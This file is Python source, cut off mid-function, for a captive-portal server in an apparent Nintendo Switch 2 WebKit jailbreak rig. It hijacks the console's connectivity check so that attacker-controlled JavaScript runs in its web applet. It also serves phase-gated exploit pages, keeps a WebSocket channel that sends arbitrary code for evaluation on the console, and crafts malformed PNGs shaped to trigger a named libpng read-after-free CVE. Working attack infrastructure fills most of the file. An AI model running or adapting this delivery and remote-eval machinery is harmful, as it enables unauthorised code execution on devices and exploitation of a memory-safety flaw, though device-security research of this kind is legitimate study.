#!/usr/bin/env python3
"""Captive-portal HTTP server for the BarbarismJB WebKit entry rig.

This is the host dns.py points the Switch 2's connectivity check at. The
console's conntest is plain HTTP and captive detection is header-based: a
response WITHOUT `X-Organization: Nintendo` flags a captive portal and the
system opens WifiWebAuthApplet on the conntest URL (docs/WEBKIT-ENTRY.md
section 1). The applet follows redirects, so we 302 it to our probe page and
attacker-controlled JavaScript runs on the console -- no TLS, no whitelist.

Routes (route by Host header, mirroring the verified public bench):

  Host = ctest.cdn.nintendo.net | ctest.p01.ctest.srv.nintendo.net |
         conntest.nintendowifi.net, any path, GET
        -> 302 Location: http://<ip>:<port>/portal   (NO X-Organization)
        -> with --conntest-mode success: 200 + X-Organization: Nintendo
           (makes the console believe it is online; cleanup/control)
  /portal         -> portal.html (templated with this host/port, no-store);
                     after a swap (see /rig/swap) -> the swapped page instead
  /page/<name>    -> serve a registered page directly by name (pages/ dir
                     stems + "probe" for --probe-page); no swap required
  /report  POST   -> telemetry sink; appends one JSON line to
                     <runs-dir>/rig-<start-ts>.jsonl
  /stage/<file>   -> serves arbitrary staged files for future payload
                     delivery (default <script dir>/stage/), octet-stream
  /health         -> ops liveness probe
  /rig/swap POST  -> control plane for launch.py's auto-chain: swaps /portal
                     to another page. No query arg -> the --probe-page
                     (back-compat); ?name=<stem> -> any pages/<stem>.html
                     (capsweep, wsagent, fontchain, ...). LOCAL PEERS ONLY
                     (loopback or this server's own bind IP); LAN/console
                     peers get 403.
  /rig/phase      -> GET: the current exploit-phase gate (fontchain class
                     pages refuse to run beyond it); POST {"phase":N}
                     (local-only) advances it. Default 1 = trigger-only.
  /rig/png/ztxt   -> GET: parameterized PNG crafter for the pngztxt oracle
                     (mode=N&seed=N; stdlib zlib only). Benign compressed
                     zTXt/iCCP/iTXt modes 0-3 are always served; malformed
                     modes 10-16 (the CVE-2026-46675 shapes) need rig
                     phase >= 2, mirroring the page's own gate.
  /ws             -> real WebSocket endpoint (RFC 6455, stdlib-only):
                     ?role=agent is the on-console eval-RPC agent
                     (wsagent.html); ?role=console is an operator bridge;
                     ?role=probe is a transient connect-back check.
  /rig/ws/send POST    -> local-only: queue {id, code} to the connected
                          agent (curl-driven eval without a console client)
  /rig/ws/state GET    -> local-only: agent/console liveness + recent traffic
  anything else   -> 404 + access-log line (sinkhole telemetry: whatever
                     else the console tries to reach lands here)

Everything is deliberately plain HTTP; there is no TLS anywhere in the rig
(docs/WEBKIT-ENTRY.md section 2). Consistent headers on every response:
Server, Cache-Control: no-store, X-Content-Type-Options: nosniff,
Connection: close. Errors are JSON: {"error":{"code":..,"message":..}}.

Port 80 matters: the console's initial conntest request goes to
http://ctest.cdn.nintendo.net/ with an implicit :80. Binding 80 needs
privileges; `sudo` this script and it drops back to SUDO_UID/SUDO_GID after
bind. The rig must only ever be reachable on the LAN.

Stdlib only. Usage:
  sudo python3 tools/webkit-rig/portal.py --ip 192.168.70.10
  sudo python3 tools/webkit-rig/portal.py --interface wlan0
  python3 tools/webkit-rig/portal.py --self-test
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import http.client
import json
import logging
import os
from pathlib import Path
import re
import socket
import socketserver
import ssl
import struct
import subprocess
import sys
import threading
import time
import zlib
from collections import deque
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import unquote, urlsplit

LOG = logging.getLogger("rig.portal")

RIG_NAME = "BarbarismJB-webkit-rig"
RIG_VERSION = "1.2.0"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PORTAL_FILE = os.path.join(SCRIPT_DIR, "portal.html")
PROBE_FILE = os.path.join(SCRIPT_DIR, "probe-32439.html")
PAGES_DIR = os.path.join(SCRIPT_DIR, "pages")

CONNTEST_HOSTS = (
    "ctest.cdn.nintendo.net",
    "ctest.p01.ctest.srv.nintendo.net",
    "conntest.nintendowifi.net",
)
X_ORGANIZATION = "X-Organization"
ORG_NINTENDO = "Nintendo"
MAX_REPORT_BYTES = 1 << 20          # 1 MiB telemetry cap
MAX_RUNS_FILE_BYTES = 64 << 20      # roll the sink file past 64 MiB

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"  # RFC 6455 magic
MAX_WS_FRAME_BYTES = 1 << 20        # 1 MiB frame cap (matches /report)
MAX_PHASE = 3                       # fontchain gate: 1 trigger-only .. 3 arb-read stub

# /rig/live dashboard: one self-contained page, no external deps, polls
# /rig/live/feed?since=<seq> every second (status + ring + verdict panel).
LIVE_HTML = """<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>rig live</title>
<style>
 html,body{margin:0;padding:0;background:#101318;color:#e8eaf0;font-family:sans-serif}
 #wrap{max-width:1100px;margin:18px auto;padding:0 14px}
 h1{font-size:20px;margin:0 0 10px} .muted{color:#8f9ab3;font-size:12px}
 #strip{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}
 .cell{background:#1a1f2b;border:1px solid #2c3446;border-radius:8px;
       padding:6px 12px;font-size:13px}
 .cell b{color:#9fb0d8;font-weight:normal;display:block;font-size:11px}
 .ok{color:#7fd6a8}.warn{color:#e8b44a}.bad{color:#e2705e}
 #cols{display:grid;grid-template-columns:2fr 1fr;gap:12px}
 @media(max-width:800px){#cols{grid-template-columns:1fr}}
 .panel{background:#1a1f2b;border:1px solid #2c3446;border-radius:8px;padding:10px}
 .panel h2{font-size:12px;color:#8f9ab3;margin:0 0 8px;text-transform:uppercase}
 #events{max-height:420px;overflow-y:auto;font:11.5px/1.5 monospace}
 #events div{border-bottom:1px dashed #222a3a;padding:1px 2px;white-space:nowrap}
 .k{color:#9fb0d8}.s{color:#cfe3ff}
 #verdicts{font:12px/1.7 monospace}
 #verdicts .pg{margin-bottom:8px}.pg b{color:#9fb0d8;font-weight:normal}
 label{font-size:12px;color:#8f9ab3}
</style></head><body><div id="wrap">
<h1>rig live <span class="muted" id="rigtag"></span></h1>
<div id="strip">
 <div class="cell"><b>uptime</b><span id="s-uptime">-</span></div>
 <div class="cell"><b>phase gate</b><span id="s-phase">-</span></div>
 <div class="cell"><b>/portal serves</b><span id="s-serving">-</span></div>
 <div class="cell"><b>ws agent</b><span id="s-agent">-</span></div>
 <div class="cell"><b>console first-seen</b><span id="s-console">-</span></div>
</div>
<div id="cols">
 <div class="panel"><h2>events (newest last)</h2>
   <label><input type="checkbox" id="autoscroll" checked> auto-scroll</label>
   <div id="events"></div></div>
 <div class="panel"><h2>page verdicts</h2><div id="verdicts">-</div></div>
</div>
<div class="muted">read-only; polls /rig/live/feed every 1s</div>
</div>
<script>
var seq = 0, evEl = document.getElementById("events");
function $(id){return document.getElementById(id);}
function clsFor(kind){
  if (kind === "applet_entry" || kind === "ws_agent") return "ok";
  if (kind === "phase_gate" || kind === "swap") return "warn";
  if (kind.indexOf("crash") !== -1 || kind === "ws_eval") return "warn";
  return "";
}
function render(d){
  var st = d.status || {};
  $("s-uptime").textContent = st.uptimeSec != null ? st.uptimeSec + "s" : "-";
  $("s-phase").textContent = st.phase != null ? st.phase : "-";
  $("s-serving").textContent = st.serving || "-";
  var a = $("s-agent");
  a.textContent = st.wsAgent ? ("UP " + (st.wsAgentPeer || "?")) : "down";
  a.className = st.wsAgent ? "ok" : "bad";
  $("s-console").textContent = st.console
      ? (st.console.peer + " @ " + String(st.console.ts).slice(11, 19)) : "-";
  $("rigtag").textContent = st.rig || "";
  var evs = d.events || [];
  for (var i = 0; i < evs.length; i++) {
    var e = evs[i];
    var row = document.createElement("div");
    var t = document.createElement("span");
    t.className = "k";
    t.textContent = String(e.ts).slice(11, 19) + " " + e.kind + " [" + e.peer + "] ";
    row.appendChild(t);
    var s = document.createElement("span");
    s.className = "s " + clsFor(e.kind);
    s.textContent = e.summary || "";
    row.appendChild(s);
    evEl.appendChild(row);
  }
  if (evs.length && $("autoscroll").checked) { evEl.scrollTop = evEl.scrollHeight; }
  var pages = st.pages || {}, html = "", k;
  for (k in pages) {
    if (!pages.hasOwnProperty(k)) continue;
    var p = pages[k];
    html += '<div class="pg"><b>' + k + '</b><br>phase ' + (p.phase || "?") +
        " &middot; " + (p.verdict || (p.effectivePhase != null
            ? "eff.phase " + p.effectivePhase : "?")) +
        '<br><span class="muted">' + String(p.ts).slice(11, 19) + "</span></div>";
  }
  $("verdicts").innerHTML = html || "-";
  seq = d.seq;
}
function tick(){
  try {
    fetch("/rig/live/feed?since=" + seq)
      .then(function (r) { return r.json(); })
      .then(render)
      .catch(function () {});
  } catch (e) {}
}
tick();
setInterval(tick, 1000);
</script></body></html>
"""

CONTENT_TYPES = {
    ".html": "text/html; charset=utf-8",
    ".js": "text/javascript; charset=utf-8",
    ".mjs": "text/javascript; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".txt": "text/plain; charset=utf-8",
    ".otf": "font/otf",
    ".ttf": "font/ttf",
    ".woff": "font/woff",
    ".woff2": "font/woff2",
    ".wasm": "application/wasm",
    ".png": "image/png",
    ".jpg": "image/jpeg",
}


class RigHttpError(Exception):
    """Coded HTTP failure; rendered as a JSON error body."""

    def __init__(self, status: int, code: str, message: str, allow: str | None = None):
        super().__init__(message)
        self.status, self.code, self.message, self.allow = status, code, message, allow


# ---------------------------------------------------------------------------
# PNG crafting (stdlib zlib only) — the pngztxt oracle's asset source
# ---------------------------------------------------------------------------

PNG_BENIGN_MODES = (0, 1, 2, 3)
PNG_MALFORMED_MODES = (10, 11, 12, 13, 14, 15, 16)
PNG_MODE_NAMES = {
    0: "baseline-no-chunk", 1: "ztxt-ok", 2: "iccp-ok", 3: "itxt-ok",
    10: "ztxt-truncated-zlib", 11: "ztxt-len-past-eof", 12: "iccp-huge-profile",
    13: "iccp-truncated-zlib", 14: "ztxt-empty-compressed",
    15: "itxt-truncated-zlib", 16: "ztxt-bad-crc",
}


def png_chunk(ctype: bytes, data: bytes, declared_len: int | None = None,
              crc: int | None = None) -> bytes:
    """One PNG chunk; declared_len/crc allow deliberately-broken framing."""
    n = len(data) if declared_len is None else declared_len
    c = (zlib.crc32(ctype + data) & 0xffffffff) if crc is None else crc
    return struct.pack(">I", n) + ctype + data + struct.pack(">I", c)


def craft_png(mode: int, seed: int = 0) -> bytes:
    """An 8x8 RGBA PNG carrying a parameterized ancillary chunk.

    Benign modes (phase 1, parse-success oracle): well-formed zTXt/iCCP/iTXt
    with valid zlib payloads -- the compressed-ancillary-chunk code path in
    the applet's libpng 1.6.57 executes without attacking it.
    Malformed modes (phase 2, rig-gated): the shapes around the
    CVE-2026-46675 read-after-free (truncated zlib streams, chunk framing
    past EOF, oversized iCCP profiles, empty streams, bad CRC)."""
    w = h = 8
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0)   # 8-bit RGBA
    scanlines = b""
    for y in range(h):
        scanlines += b"\x00"                               # filter: none
        for x in range(w):
            scanlines += bytes(((x * 31 + seed) & 0xff, (y * 17 + seed) & 0xff,
                                ((x + y) * 7) & 0xff, 255))
    idat = zlib.compress(scanlines, 9)
    text = ("capsweep-seed-%d padding padding padding" % seed).encode()
    profile = b"fake-profile " * 64 + text                 # small deterministic profile

    if mode == 0:
        anc = b""
    elif mode == 1:                                        # zTXT: kw\0 method zlib(text)
        anc = png_chunk(b"zTXt", b"Comment\x00\x00" + zlib.compress(text, 9))
    elif mode == 2:                                        # iCCP: kw\0 method zlib(profile)
        anc = png_chunk(b"iCCP", b"fake profile\x00\x00" + zlib.compress(profile, 9))
    elif mode == 3:                                        # iTXt compressed: kw\0 1 0 lang\0 tkw\0 zlib
        anc = png_chunk(b"iTXt",
                        b"Note\x00\x01\x00en\x00note\x00" + zlib.compress(text, 9))
    elif mode == 10:                                       # zTXt zlib stream cut mid-data
        blob = zlib.compress(text * 8, 9)
        anc = png_chunk(b"zTXt", b"Comment\x00\x00" + blob[:len(blob) // 2])
    elif mode == 11:                                       # declared length 64B past the data
        data = b"Comment\x00\x00" + zlib.compress(text, 9)
        anc = png_chunk(b"zTXt", data, declared_len=len(data) + 64)
    elif mode == 12:                                       # iCCP with a ~1MiB profile
        big = (profile * (1 + (1 << 20) // len(profile)))[:1 << 20]
        anc = png_chunk(b"iCCP", b"big profile\x00\x00" + zlib.compress(big, 6))
    elif mode == 13:                                       # iCCP zlib stream truncated
        blob = zlib.compress(profile, 9)
        anc = png_chunk(b"iCCP", b"fake profile\x00\x00" + blob[:len(blob) - 6])
    elif mode == 14:                                       # zTXt zero-length compressed data
        anc = png_chunk(b"zTXt", b"Comment\x00\x00")
    elif mode == 15:                                       # iTXt compressed payload truncated
        blob = zlib.compress(text, 9)
        anc = png_chunk(b"iTXt",
                        b"Note\x00\x01\x00en\x00note\x00" + blob[:len(blob) // 3])
    elif mode == 16:                                       # zTXt with a wrong CRC
        anc = png_chunk(b"zTXt", b"Comment\x00\x00" + zlib.compress(text, 9),
                        crc=0xdeadbeef)
    else:
        raise ValueError("unknown png mode %d" % mode)
    return sig + png_chunk(b"IHDR", ihdr) + png_chunk(b"IDAT", idat) + anc + \
        png_chunk(b"IEND", b"")


# ---------------------------------------------------------------------------
# WebSocket bridge (RFC 6455, stdlib-only) — the wsagent control channel
# ---------------------------------------------------------------------------

WS_OP_CONT, WS_OP_TEXT, WS_OP_BIN = 0x0, 0x1, 0x2
WS_OP_CLOSE, WS_OP_PING, WS_OP_PONG = 0x8, 0x9, 0xA


def ws_read_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("websocket eof")
        buf += chunk
    return buf


def ws_read_frame(sock: socket.socket) -> tuple[int, int, bytes]:
    """One RFC 6455 frame: (fin, opcode, unmasked payload)."""
    hdr = ws_read_exact(sock, 2)
    fin, op = bool(hdr[0] & 0x80), hdr[0] & 0x0F
    masked, length = bool(hdr[1] & 0x80), hdr[1] & 0x7F
    if length == 126:
        length = struct.unpack(">H", ws_read_exact(sock, 2))[0]
    elif length == 127:
        length = struct.unpack(">Q", ws_read_exact(sock, 8))[0]
    if length > MAX_WS_FRAME_BYTES:
        raise ConnectionError("websocket frame over cap (%d B)" % length)
    mask = ws_read_exact(sock, 4) if masked else None
    data = ws_read_exact(sock, length) if length else b""
    if mask:
        data = bytes(b ^ mask[i & 3] for i, b in enumerate(data))
    return (1 if fin else 0), op, data


def ws_encode_frame(op: int, payload: bytes) -> bytes:
    out = bytearray([0x80 | op])
    n = len(payload)
    if n < 126:
        out.append(n)
    elif n < 65536:
        out.append(126)
        out += struct.pack(">H", n)
    else:
        out.append(127)
        out += struct.pack(">Q", n)
    out += payload
    return bytes(out)


class WsSession:
    """One upgraded connection. role=agent (the console page), role=console
    (operator bridge) or role=probe (transient connect-back check)."""

    def __init__(self, sock: socket.socket, peer: str, role: str, hub: "WsHub"):
        self.sock, self.peer, self.role, self.hub = sock, peer, role, hub
        self.wlock = threading.Lock()
        self.alive = True
        self.conn_id = hub.next_conn_id()

    def _log_frame(self, direction: str, op: int, payload: bytes) -> None:
        hub = self.hub
        if hub.frame_sink is None:
            return
        try:
            hub.frame_sink({
                "ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
                "dir": direction,          # "in" (peer->rig) | "out" (rig->peer)
                "role": self.role, "peer": self.peer,
                "opcode": op, "size": len(payload),
                "preview": payload[:512].decode("utf-8", "replace")})
        except Exception:
            pass                          # frame logging must never break I/O

    def send_json(self, obj: dict) -> bool:
        return self.send_text(json.dumps(obj, separators=(",", ":")))

    def send_text(self, text: str) -> bool:
        if not self.alive:
            return False
        payload = text.encode("utf-8")
        try:
            with self.wlock:
                self.sock.sendall(ws_encode_frame(WS_OP_TEXT, payload))
            self._log_frame("out", WS_OP_TEXT, payload)
            return True
        except OSError:
            self.alive = False
            return False

    def close(self, code: int = 1000) -> None:
        self.alive = False
        try:
            with self.wlock:
                self.sock.sendall(ws_encode_frame(WS_OP_CLOSE,
                                                  struct.pack(">H", code)))
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass

    def run(self) -> None:
        self.hub.attach(self)
        frag_op, frag_buf = None, b""
        try:
            while self.alive:
                fin, op, data = ws_read_frame(self.sock)
                if op == WS_OP_CLOSE:
                    self._log_frame("in", WS_OP_CLOSE, data)
                    self.close(struct.unpack(">H", data[:2])[0] if len(data) >= 2 else 1000)
                    return
                if op == WS_OP_PING:
                    self._log_frame("in", WS_OP_PING, data)
                    with self.wlock:
                        self.sock.sendall(ws_encode_frame(WS_OP_PONG, data))
                    continue
                if op == WS_OP_PONG:
                    continue
                if op in (WS_OP_TEXT, WS_OP_BIN):
                    if not fin:                     # start of fragmentation
                        frag_op, frag_buf = op, data
                        continue
                    self._log_frame("in", op, data)
                    self.hub.on_message(self, op, data)
                elif op == WS_OP_CONT and frag_op is not None:
                    frag_buf += data
                    if len(frag_buf) > MAX_WS_FRAME_BYTES:
                        raise ConnectionError("fragmented message over cap")
                    if fin:
                        self._log_frame("in", frag_op, frag_buf)
                        self.hub.on_message(self, frag_op, frag_buf)
                        frag_op, frag_buf = None, b""
                else:
                    self.close(1002)                # protocol violation
                    return
        except (ConnectionError, OSError, struct.error, ValueError) as e:
            self.hub.event("transport", peer=self.peer, role=self.role,
                           detail=repr(e))
        finally:
            self.alive = False
            self.hub.detach(self)
            try:
                self.sock.close()
            except OSError:
                pass


class WsHub:
    """Routes eval-RPC traffic: controllers (operator or /rig/ws/send) send
    {id, code}; the agent (wsagent.html on the console) evaluates and replies
    {id, ok, result|error, elapsed}; replies route back to the origin."""

    def __init__(self, frame_sink=None, on_event=None):
        self._lock = threading.Lock()
        self._conn_seq = 0
        self._msg_seq = 0
        self.frame_sink = frame_sink          # RigConfig.append_ws_frame
        self.on_event = on_event              # RigConfig._ws_live_event
        self.agent: WsSession | None = None
        self.controllers: dict[int, WsSession] = {}
        self.pending: dict[str, int] = {}           # msg id -> conn_id
        self.counters = {"agent_msgs": 0, "agent_replies": 0, "console_msgs": 0,
                         "forwards": 0, "heartbeats": 0, "dropped": 0}
        self.events: deque[dict] = deque(maxlen=200)

    def live(self, kind: str, peer: str, summary: str) -> None:
        if self.on_event:
            try:
                self.on_event(kind, peer, summary)
            except Exception:
                pass

    def next_conn_id(self) -> int:
        with self._lock:
            self._conn_seq += 1
            return self._conn_seq

    def alloc_msg_id(self, explicit: str | None = None) -> str:
        """Message id for a controller-initiated command (explicit or h<n>)."""
        with self._lock:
            self._msg_seq += 1
            return str(explicit or ("h%d" % self._msg_seq))

    def event(self, kind: str, **kw) -> None:
        entry = {"ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
                 "kind": kind, **kw}
        with self._lock:
            self.events.append(entry)
        LOG.info("WS %s %s", kind, json.dumps(kw, separators=(",", ":"))[:300])

    def attach(self, sess: WsSession) -> None:
        with self._lock:
            if sess.role == "agent":
                if self.agent is not None and self.agent.alive:
                    old = self.agent
                else:
                    old = None
                self.agent = sess
            else:
                self.controllers[sess.conn_id] = sess
                old = None
        if old is not None:
            self.event("agent_replaced", peer=old.peer)
            old.close(1008)
        self.event("open", peer=sess.peer, role=sess.role, conn=sess.conn_id)
        if sess.role == "agent":
            self.live("ws_agent", sess.peer, "agent connected")
        elif sess.role == "console":
            self.live("ws_console", sess.peer, "console attached")
        if sess.role == "agent":
            sess.send_json({"t": "welcome", "agent": True})
        elif sess.role == "probe":
            sess.send_json({"t": "welcome", "probe": True})
            sess.close()

    def detach(self, sess: WsSession) -> None:
        with self._lock:
            if sess.role == "agent" and self.agent is sess:
                self.agent = None
            self.controllers.pop(sess.conn_id, None)
        self.event("close", peer=sess.peer, role=sess.role, conn=sess.conn_id)
        if sess.role == "agent":
            self.live("ws_agent", sess.peer, "agent disconnected")

    def on_message(self, sess: WsSession, op: int, data: bytes) -> None:
        if op != WS_OP_TEXT:
            self.event("binary_ignored", peer=sess.peer, role=sess.role,
                       size=len(data))
            return
        try:
            msg = json.loads(data.decode("utf-8"))
            if not isinstance(msg, dict):
                raise ValueError("not an object")
        except (UnicodeDecodeError, json.JSONDecodeError, ValueError) as e:
            self.event("bad_json", peer=sess.peer, role=sess.role,
                       detail=str(e)[:120])
            sess.send_json({"t": "error", "error": "unparsable message"})
            return
        if sess.role == "agent":
            self._from_agent(sess, msg)
        else:
            self._from_controller(sess, msg)

    def _from_agent(self, sess: WsSession, msg: dict) -> None:
        with self._lock:
            self.counters["agent_msgs"] += 1
        if "hb" in msg:
            with self._lock:
                self.counters["heartbeats"] += 1
            sess.send_json({"t": "hb-ack", "seq": msg.get("seq")})
            return
        mid = str(msg.get("id"))
        with self._lock:
            origin_id = self.pending.pop(mid, None)
            origin = self.controllers.get(origin_id) if origin_id else None
            targets = [origin] if origin is not None else list(self.controllers.values())
            self.counters["agent_replies"] += 1
        event_kw = {"id": mid, "ok": bool(msg.get("ok")),
                    "elapsed": msg.get("elapsed"),
                    "peer": sess.peer}
        if not msg.get("ok"):
            event_kw["error"] = str(msg.get("error"))[:200]
        else:
            result = msg.get("result")
            event_kw["result_prefix"] = (json.dumps(result)[:200]
                                         if result is not None else None)
        self.event("reply", **event_kw)
        self.live("ws_eval", sess.peer,
                  "eval#%s %s %sms" % (mid, "ok" if msg.get("ok") else "ERR",
                                       msg.get("elapsed")))
        delivered = 0
        for target in targets:
            if target.send_json(msg):
                delivered += 1
        if not targets:
            # curl-driven command with no console attached: the reply lives in
            # /rig/ws/state events (and the jsonl-side agent telemetry)
            self.event("reply_unobserved", id=mid)

    def _from_controller(self, sess: WsSession, msg: dict) -> None:
        with self._lock:
            self.counters["console_msgs"] += 1
        mid = self.alloc_msg_id(str(msg.get("id")) if msg.get("id") else None)
        ok = self.send_to_agent(mid, str(msg.get("code", "")), origin=sess.conn_id)
        if not ok:
            sess.send_json({"id": mid, "ok": False,
                            "error": "agent not connected"})

    def send_to_agent(self, mid: str, code: str, origin: int | None = None) -> bool:
        with self._lock:
            agent = self.agent
            alive = agent is not None and agent.alive
            if origin is not None:
                self.pending[mid] = origin
            if alive:
                self.counters["forwards"] += 1
        if not alive:
            with self._lock:
                self.pending.pop(mid, None)
                self.counters["dropped"] += 1
            self.event("drop", id=mid, reason="agent_offline")
            return False
        sent = agent.send_json({"id": mid, "code": code})
        self.event("forward", id=mid, peer=agent.peer, bytes=len(code))
        return sent

    def state(self) -> dict:
        with self._lock:
            return {
                "agent": bool(self.agent and self.agent.alive),
                "agent_peer": self.agent.peer if self.agent else None,
                "controllers": len(self.controllers),
                "pending": len(self.pending),
                "counters": dict(self.counters),
                "events": list(self.events)[-50:],
            }


class RigConfig:
    def __init__(self, ip: str, port: int, runs_dir: str, stage_dir: str,
                 conntest_profile: str = "redirect", probe_file: str | None = None,
                 bvc_profile: str = "404", fontchain_phase: int = 1):
        self.ip, self.port = ip, port
        self.runs_dir, self.stage_dir, self.conntest_profile = runs_dir, stage_dir, conntest_profile
        self.bvc_profile = bvc_profile
        os.makedirs(runs_dir, exist_ok=True)
        os.makedirs(stage_dir, exist_ok=True)
        stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        self.started_at = datetime.now(timezone.utc)
        self.runs_path = os.path.join(runs_dir, "rig-%s.jsonl" % stamp)
        self._runs_file = open(self.runs_path, "a", encoding="utf-8")
        self._runs_lock = threading.Lock()
        self._writes_since_check = 0
        # session-observability sinks (append+flush so everything survives
        # a crash of any component): full-fidelity access log + WS frames
        self.access_path = os.path.join(runs_dir, "access-%s.jsonl" % stamp)
        self._access_file = open(self.access_path, "a", encoding="utf-8")
        self.ws_log_path = os.path.join(runs_dir, "ws-%s.jsonl" % stamp)
        self._ws_file = open(self.ws_log_path, "a", encoding="utf-8")
        self._sink_lock = threading.Lock()
        # /rig/live dashboard state: monotonic event ring + per-page verdicts
        self.live_seq = 0
        self.live_ring: deque[dict] = deque(maxlen=2000)
        self.live_lock = threading.Lock()
        self.console_first_seen: dict | None = None
        self.last_page_reports: dict[str, dict] = {}
        with open(PORTAL_FILE, "r", encoding="utf-8") as f:
            html = f.read()
        self.portal_body = (html
                            .replace("{{RIG_HOST}}", ip)
                            .replace("{{RIG_PORT}}", str(port))).encode("utf-8")
        # Page registry: "portal" is always present; --probe-page registers as
        # "probe" (launch.py --auto-probe swaps to it); every pages/*.html is
        # registered by filename stem (capsweep, wsagent, fontchain, ...).
        # All templated with this host/port the same way; reachable at
        # /page/<name> directly or at /portal after a local /rig/swap?name=.
        self.pages: dict[str, bytes] = {}
        self._register_page("probe", probe_file)
        if os.path.isdir(PAGES_DIR):
            for entry in sorted(os.listdir(PAGES_DIR)):
                if entry.endswith(".html"):
                    self._register_page(entry[:-len(".html")],
                                        os.path.join(PAGES_DIR, entry))
        self.serving = "portal"
        self._page_lock = threading.Lock()
        self.fontchain_phase = max(1, min(MAX_PHASE, int(fontchain_phase)))
        # wsagent control channel state (frame log + live ring wired in)
        self.ws_hub = WsHub(frame_sink=self.append_ws_frame,
                            on_event=self._ws_live_event)

    def _register_page(self, name: str, path: str | None) -> None:
        if not path or not os.path.isfile(path):
            return
        with open(path, "r", encoding="utf-8") as f:
            body = f.read()
        self.pages[name] = (body
                            .replace("{{RIG_HOST}}", self.ip)
                            .replace("{{RIG_PORT}}", str(self.port))).encode("utf-8")

    # ------------------------------------------------ observability sinks
    def append_access(self, rec: dict) -> None:
        """One JSON line per request (and per control-plane action) to the
        run dir; append+flush so the log survives a crash."""
        try:
            line = json.dumps(rec, separators=(",", ":")) + "\n"
            with self._sink_lock:
                self._access_file.write(line)
                self._access_file.flush()
        except OSError:
            pass                       # logging must never break serving

    def append_ws_frame(self, rec: dict) -> None:
        """One JSON line per WS frame, both directions."""
        try:
            line = json.dumps(rec, separators=(",", ":")) + "\n"
            with self._sink_lock:
                self._ws_file.write(line)
                self._ws_file.flush()
        except OSError:
            pass

    def live_emit(self, kind: str, peer: str = "-", summary: str = "",
                  data=None) -> int:
        """Append to the /rig/live ring with a monotonic seq."""
        with self.live_lock:
            self.live_seq += 1
            seq = self.live_seq
            self.live_ring.append({
                "seq": seq,
                "ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
                "kind": kind, "peer": peer, "summary": summary,
                "data": data if data is not None else None})
            return seq

    def live_feed(self, since: int) -> dict:
        with self.live_lock:
            events = [dict(e) for e in self.live_ring if e["seq"] > since]
            seq = self.live_seq
            pages = {k: dict(v) for k, v in self.last_page_reports.items()}
            console = dict(self.console_first_seen) if self.console_first_seen else None
        return {"seq": seq, "events": events,
                "status": self.live_status(pages, console)}

    def live_status(self, pages: dict, console: dict | None) -> dict:
        return {
            "uptimeSec": int((datetime.now(timezone.utc) - self.started_at).total_seconds()),
            "phase": self.get_phase(),
            "serving": self.serving,
            "wsAgent": bool(self.ws_hub.agent and self.ws_hub.agent.alive),
            "wsAgentPeer": self.ws_hub.agent.peer if self.ws_hub.agent else None,
            "console": console,
            "pages": pages,
            "rig": "%s/%s" % (RIG_NAME, RIG_VERSION),
        }

    def note_applet(self, peer: str) -> None:
        """First WifiWebAuthApplet-UA telemetry: the entry-surface moment."""
        if self.console_first_seen is None:
            self.console_first_seen = {"peer": peer,
                                       "ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds")}
            self.live_emit("applet_entry", peer, "first applet telemetry")

    def _ws_live_event(self, kind: str, peer: str, summary: str) -> None:
        """WsHub -> live ring bridge (open/close/eval outcomes)."""
        self.live_emit(kind, peer, summary)

    def portal_url(self) -> str:
        return "http://%s:%d/portal" % (self.ip, self.port)

    def swap_to(self, name: str) -> bool:
        """Flip /portal to the named page. Returns False if the page is not
        registered or /portal already serves it."""
        with self._page_lock:
            if name not in self.pages or self.serving == name:
                return False
            self.serving = name
            return True

    def swap_to_probe(self) -> bool:
        """Back-compat shim: flip /portal to the --probe-page."""
        return self.swap_to("probe")

    def page_body(self, name: str | None = None) -> bytes | None:
        with self._page_lock:
            if name is None:
                name = self.serving
            if name == "portal":
                return self.portal_body
            return self.pages.get(name)

    def set_phase(self, phase: int) -> int:
        with self._page_lock:
            self.fontchain_phase = max(1, min(MAX_PHASE, int(phase)))
            return self.fontchain_phase

    def get_phase(self) -> int:
        with self._page_lock:
            return self.fontchain_phase

    def append_report(self, envelope: dict) -> None:
        line = json.dumps(envelope, separators=(",", ":")) + "\n"
        with self._runs_lock:
            self._runs_file.write(line)
            self._runs_file.flush()
            self._writes_since_check += 1
            if self._writes_since_check >= 256:
                self._writes_since_check = 0
                if self._runs_file.tell() > MAX_RUNS_FILE_BYTES:
                    roll = self.runs_path + ".%d" % int(time.time())
                    self._runs_file.close()
                    os.replace(self.runs_path, roll)
                    LOG.info("runs file rolled to %s", roll)
                    self._runs_file = open(self.runs_path, "a", encoding="utf-8")

    def close(self) -> None:
        with self._runs_lock:
            self._runs_file.close()
        with self._sink_lock:
            try:
                self._access_file.close()
            except OSError:
                pass
            try:
                self._ws_file.close()
            except OSError:
                pass


class RigHTTPServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, addr, cfg: RigConfig):
        self.cfg = cfg
        super().__init__(addr, PortalHandler)

    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()

    def handle_error(self, request, client_address):
        # barbarism: TLS clients that reject our self-signed cert abort during
        # the handshake; that is SIGNAL (HTTPS conntest confirmed), not noise.
        # The exception text carries python's DECODED alert (e.g. SSLV3_ALERT_
        # UNKNOWN_CA) — the exact rejection reason, gold for pinning analysis.
        exc = sys.exc_info()[1]
        if isinstance(exc, ssl.SSLError) or isinstance(exc, ConnectionError) \
                or isinstance(exc, OSError):
